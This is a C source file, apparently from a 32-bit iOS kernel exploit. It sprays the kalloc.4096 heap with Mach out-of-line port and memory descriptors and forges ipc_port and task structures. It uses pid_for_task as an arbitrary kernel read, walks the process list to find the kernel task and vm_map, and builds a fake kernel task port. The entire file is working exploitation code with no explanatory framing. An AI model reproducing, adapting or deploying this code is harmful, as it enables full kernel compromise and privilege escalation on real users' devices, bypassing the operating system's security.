#include "mach-ports.h"

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, 
        mach_port_t *own_task_port, mach_port_t **before_ports,
        mach_port_t **after_ports, mach_port_t **spray_ports) {
    int ret;

    
    *before_ports = calloc(N_BEFORE_PORTS, sizeof(mach_port_t));
    *after_ports = calloc(N_AFTER_PORTS, sizeof(mach_port_t));
    *spray_ports = calloc(N_SPRAY_PORTS, sizeof(mach_port_t));

    // allocate before ports to fill gaps and hopefully make target port allocated
    // on a page completely full of before and after ports
    for (int i = 0; i < N_BEFORE_PORTS; i++) {
	    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*before_ports)[i])) != KERN_SUCCESS) {
            printf("before_ports Allocation %d Failed: %x\n", i, ret);
            return 1;
	    }
    }

    // allocate target port, this is what we will control
    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, target_port) != KERN_SUCCESS)) {
        printf("target_port Allocation Failed: %x", ret);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *target_port, *target_port, MACH_MSG_TYPE_MAKE_SEND);

    // fill in the rest of the page so we can completely free it
    for (int i = 0; i < N_AFTER_PORTS; i++) {
	    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*after_ports)[i])) != KERN_SUCCESS) {
            printf("after_ports Allocation %d Failed: %x\n", i, ret);
            return 1;
	    }
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receive_port)) != KERN_SUCCESS) {
        printf("receive_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        return 1;
    }

    // these will be used to spray into k.4096
    for (int i = 0; i < N_SPRAY_PORTS; i++) {
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*spray_ports)[i])) != KERN_SUCCESS) {
            printf("spray_ports Allocation %d Failed: %x", i, ret);
            return 1;
        }
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, own_task_port)) != KERN_SUCCESS) {
        printf("own_task_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        mach_port_destroy(mach_task_self(), *receive_port);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *own_task_port, *own_task_port, MACH_MSG_TYPE_MAKE_SEND);

    return 0;
}

void destroy_ports(mach_port_t receive_port, mach_port_t *before_ports, mach_port_t *after_ports) {
    for (int i = 0; i < N_BEFORE_PORTS; i++)
    	mach_port_destroy(mach_task_self(), before_ports[i]);
    printf("Destroyed before_ports\n");

    for (int i = 0; i < N_AFTER_PORTS; i++)
    	mach_port_destroy(mach_task_self(), after_ports[i]);
    printf("Destroyed after_ports\n");

    mach_port_destroy(mach_task_self(), receive_port);
    printf("Destroyed receive_port\n");
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data);

int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port) {
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++) {
        if (i == 2)
            ports[i] = target_port;
        else if (i == 3)
            ports[i] = other_port;
        else if (i == 4)
            ports[i] = mach_host_self();
        else
            ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports)) {
        printf("Could Not Leak Port Pointers\n");
        return 1;
    } else {
        printf("Sprayed Heap To Leak Port Pointer\n");
        ret = 0;
    }

    free(ports);
    return ret;
}


int spray_null_port_pointer(mach_port_t receive_port) {
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++) {
        ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports)) {
        printf("Could Not Leak Port Pointers\n");
        return 1;
    } else {
        printf("Sprayed Heap To Leak Port Pointer\n");
        ret = 0;
    }

    free(ports);
    return ret;
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data) {
    size_t i, msg_size;
    mach_port_t *ports;
    ool_leak_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_leak_msg) +
		(n_ool_ports_descriptor_messages * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = n_ool_ports_descriptor_messages;

    for (i = 0; i < n_ool_ports_descriptor_messages; i++) {
        ool_msg->ool_ports[i].address = data;
        ool_msg->ool_ports[i].count = count;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS) {
        printf("Sending Mach Message Failed: %x\n", ret);
        printf("Could Not Spray Heap Via Port Descriptors\n");
        return 1;
    } else
	    printf("Successfully Sent Mach Messages For Port Descriptor Spray\n");

    free(ool_msg);

    return 0;
}

struct ool_spray_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool[];
};

typedef struct ool_spray_msg * ool_spray_msg_t;

int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size) {
    size_t msg_size;
    ool_spray_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = sizeof(struct ool_spray_msg) + sizeof(mach_msg_ool_descriptor_t);

    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size = msg_size;
    ool_msg->header.msgh_remote_port = *spray_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x20202020;

    ool_msg->body.msgh_descriptor_count = 1;

    ool_msg->ool->address = data;
    ool_msg->ool->size = KALLOC_4096;
    ool_msg->ool->deallocate = 0;
    ool_msg->ool->type = MACH_MSG_OOL_DESCRIPTOR;
    ool_msg->ool->copy = MACH_MSG_PHYSICAL_COPY;

    if ((ret = mach_msg_send(&ool_msg->header)) != MACH_MSG_SUCCESS) {
        printf("Sending Mach Message Failed: %x", ret);
        printf("Could Not Spray Heap Via Memory Descriptors");
        free(ool_msg);
        return 1;
    }
    free(ool_msg);
    return 0;
}

int spray_kalloc_4096(mach_port_t *spray_ports, mach_port_t target_port,
				    uint32_t port_offset, int *port_number) {
    int ret;
    uint8_t *data;
    uint32_t *ip_context;
    uint32_t *lck_something;
    uint32_t offset;
    mach_port_context_t context;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ip_context = (uint32_t *)(data + port_offset - SIZEOF_VM_MAP_HEADER + IP_CONTEXT_PORT_OFFSET);
    lck_something = (uint32_t *)(data + port_offset - SIZEOF_VM_MAP_HEADER + IO_LOCK_TYPE_PORT_OFFSET);
    *lck_something = 17;
    ret = 0;

    for (int i = 0; i < N_SPRAY_PORTS; i++) {
        *ip_context = MAGIC_CONSTANT + i;
        if ((ret = ool_descriptor_spray(&spray_ports[i], data, KALLOC_4096)) != MACH_MSG_SUCCESS) {
            printf("Sending Mach Message %d Failed: %x", i, ret);
            ret = 1;
            break;
        }
    }
    printf("sprayed k4096\n");

    if (!ret) {
        int ret2 = mach_port_get_context(mach_task_self(), target_port, &context);
        printf("Context: 0x%x ret: 0x%x\n", context, ret2);

        if (context - MAGIC_CONSTANT >= N_SPRAY_PORTS) {
            printf("Context To Big. Spray Not Successful.\n");
            ret = 1;
        } else {
            *port_number = context - MAGIC_CONSTANT;
            printf("Port Number: %d\n", *port_number);
        }
    }

    if (ret) {
	    printf("Could Not Spray Into target_port\n");
    } else {
	    printf("Spraying kalloc.4096 Successful\n");
    }

    free(data);
    return ret;
}

uint32_t get_port_offset(uint32_t port_pointer) {
    return port_pointer & 0xfff;
}

uint32_t get_port_page(uint32_t port_pointer) {
    return port_pointer & ~0xfff;
}

uint32_t read_32bit(int read_fd, int write_fd, uint32_t port_offset,
		    uint32_t address, mach_port_t *target_port) {
    uint32_t task_offset;
    uint8_t *data, *data2;
    uint32_t *io_bits, *io_references, *ip_srights, *refcount;
    uint32_t *bsd_info, *ip_context, *kobject, *lock_type;
    mach_port_context_t magic;
    pid_t read_value;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    ip_context = (uint32_t *)(data + port_offset + IP_CONTEXT_PORT_OFFSET);
    io_bits = (uint32_t *)(data + port_offset + IO_BITS_PORT_OFFSET);
    io_references = (uint32_t *)(data + port_offset + IO_REFERENCES_PORT_OFFSET);
    ip_srights = (uint32_t *)(data + port_offset + IP_SRIGHTS_PORT_OFFSET);
    kobject = (uint32_t *)(data + port_offset + KOBJECT_PORT_OFFSET);
    lock_type = (uint32_t *)(data + port_offset + IO_LOCK_TYPE_PORT_OFFSET);

    *io_bits = IO_BITS_ACTIVE | IKOT_TASK;
    *io_references = 0xff;
    *ip_srights = 0xff;
    *ip_context = MAGIC_CONSTANT;
    *lock_type = 0x11;

    if (port_offset < 0x700)
	    task_offset = 0x800;
    else
	    task_offset = 0;

    refcount = (uint32_t *)(data + task_offset + REFCOUNT_TASK_OFFSET);
    bsd_info = (uint32_t *)(data + task_offset + BSD_INFO_TASK_OFFSET);

    *refcount = 0xff;
    *bsd_info = address - PID_PROC_OFFSET;

    *kobject = (uint32_t)(data + task_offset);
    printf("Set kobject to 0x%x\n", *kobject);

    read(read_fd, data2, KALLOC_4096+1);
    write(write_fd, data, KALLOC_4096);

    read_value = 0;
    pid_for_task(*target_port, &read_value);

    free(data);
    free(data2);

    return read_value;
}

uint32_t get_own_task_pointer(int read_fd, int write_fd, uint32_t port_offset,
			      uint32_t port_address, mach_port_t *target_port)
{
    uint32_t ip_receiver, is_task;

    ip_receiver = read_32bit(read_fd, write_fd, port_offset,
			     port_address + IP_RECEIVER_PORT_OFFSET,
			     target_port);
    printf("IP Receiver: %x\n", ip_receiver);

    is_task = read_32bit(read_fd, write_fd, port_offset,
			 ip_receiver + IS_TASK_IPC_SPACE_OFFSET,
			 target_port);
    printf("Task Pointer: %x\n", is_task);

    return is_task;
}

uint32_t get_kernel_task_pointer(int read_fd, int write_fd, uint32_t port_offset,
				 uint32_t port_address, mach_port_t *target_port)
{
    uint32_t own_task, kernel_task, bsd_info;
    uint32_t pid;

    own_task = get_own_task_pointer(read_fd, write_fd, port_offset, port_address,
				    target_port);

    for (bsd_info = read_32bit(read_fd, write_fd, port_offset,
			       own_task + BSD_INFO_TASK_OFFSET,
			       target_port);
	 bsd_info != 0;
	 bsd_info = read_32bit(read_fd, write_fd, port_offset,
			       bsd_info + NEXT_PROC_OFFSET,
			       target_port))
    {
	pid = read_32bit(read_fd, write_fd, port_offset,
			 bsd_info + PID_PROC_OFFSET,
			 target_port);
	if (pid == KERNEL_PID)
	    break;
    }

    printf("Pid: %d\n", pid);
    if (pid != KERNEL_PID) {
        printf("Pid != 0. Could Not Get Kernel Task.\n");
        return 0;
    }

    printf("Kernel Proc: %x\n", bsd_info);
    kernel_task = read_32bit(read_fd, write_fd, port_offset,
			     bsd_info + TASK_PROC_OFFSET,
			     target_port);
    printf("Kernel Task: 0x%x\n", kernel_task);
    return kernel_task;
}

uint32_t get_kernel_vm_map(int read_fd, int write_fd, uint32_t port_offset,
			   uint32_t port_address, mach_port_t *target_port)
{
    uint32_t kernel_task, vm_map;

    kernel_task = get_kernel_task_pointer(read_fd, write_fd, port_offset, port_address,
					  target_port);
    if (kernel_task)
    {
	    vm_map = read_32bit(read_fd, write_fd, port_offset,
			    kernel_task + VM_MAP_TASK_OFFSET,
			    target_port);
	    printf("Kernel VM Map: 0x%x\n", vm_map);
    } else {
        printf("Could Not Get VM Map\n");
        return 0;
    }
    return vm_map;
}

uint32_t get_kernel_ip_receiver(int read_fd, int write_fd, uint32_t port_offset,
				mach_port_t *target_port, uint32_t host_pointer) {
    uint32_t ip_receiver;

    ip_receiver = read_32bit(read_fd, write_fd, port_offset,
			     host_pointer + IP_RECEIVER_PORT_OFFSET,
			     target_port);
    printf("Kernel IP Receiver: 0x%x\n", ip_receiver);
    return ip_receiver;
}

int create_kernel_task_port(int read_fd, int write_fd, uint32_t port_offset,
			    uint32_t port_address, mach_port_t *target_port,
			    uint32_t host_pointer) {
    int ret;
    uint32_t task_offset;
    uint8_t *data, *data2, *task_lock_type;
    uint32_t *io_bits, *io_references, *ip_srights, *refcount, *active;
    uint32_t *kobject, *ip_receiver, *vm_map, *lock_type;
    mach_port_context_t magic;

    ret = 0;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    io_bits = (uint32_t *)(data + port_offset + IO_BITS_PORT_OFFSET);
    io_references = (uint32_t *)(data + port_offset + IO_REFERENCES_PORT_OFFSET);
    ip_srights = (uint32_t *)(data + port_offset + IP_SRIGHTS_PORT_OFFSET);
    kobject = (uint32_t *)(data + port_offset + KOBJECT_PORT_OFFSET);
    lock_type = (uint32_t *)(data + port_offset + IO_LOCK_TYPE_PORT_OFFSET);
    ip_receiver = (uint32_t *)(data + port_offset + IP_RECEIVER_PORT_OFFSET);

    *io_bits = IO_BITS_ACTIVE | IKOT_TASK;
    *io_references = 0xff;
    *ip_srights = 0xff;
    *lock_type = 0x11;
    *ip_receiver = get_kernel_ip_receiver(read_fd, write_fd, port_offset,
					  target_port, host_pointer);

    if (port_offset < 0x700)
	    task_offset = 0x800;
    else
	    task_offset = 0;

    refcount = (uint32_t *)(data + task_offset + REFCOUNT_TASK_OFFSET);
    vm_map = (uint32_t *)(data + task_offset + VM_MAP_TASK_OFFSET);
    task_lock_type = data + task_offset + LOCK_TYPE_TASK_OFFSET;
    active = (uint32_t *)(data + task_offset + ACTIVE_TASK_OFFSET);

    *refcount = 0xff;
    *task_lock_type = 0x22;
    *active = 1;
    *vm_map = get_kernel_vm_map(read_fd, write_fd, port_offset,
				port_address, target_port);
    if (!vm_map) {
        printf("Could Not Create Kernel Task Port\n");
        ret = 1;
    } else {
        *kobject = (uint32_t)(data + task_offset);

        read(read_fd, data2, KALLOC_4096+1);
        write(write_fd, data, KALLOC_4096);
    }

    free(data);
    free(data2);
    return ret;
}
